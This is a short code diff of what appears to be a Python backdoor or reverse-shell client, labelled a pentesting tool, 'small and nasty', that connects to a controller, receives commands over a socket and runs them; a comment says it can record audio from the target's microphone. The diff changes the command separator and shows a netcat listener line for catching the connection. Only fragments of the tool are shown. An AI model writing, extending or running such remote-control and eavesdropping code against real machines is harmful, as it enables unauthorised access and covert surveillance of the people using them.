@@ -6,8 +6,10 @@ Tool made only for pentesting.
 
 Small and nasty.
 
-Update: It now has a function that allows recording audio from the target
+IN SOON >>   Update: It now has a function that allows recording audio from the target
 machine's microphone.
+
+
 
 # put netcat in mode listener, to test
 # nc -l -v -p <port_to_connect>
@@ -52,7 +54,7 @@ def main(host, port):
 
             try:
                 msg = s.recv(20480)
-                allofem = msg.split(",")
+                allofem = msg.split(";")
                 for onebyone in allofem:
                     commands = onebyone.split()
                     if commands[0] == "cd":
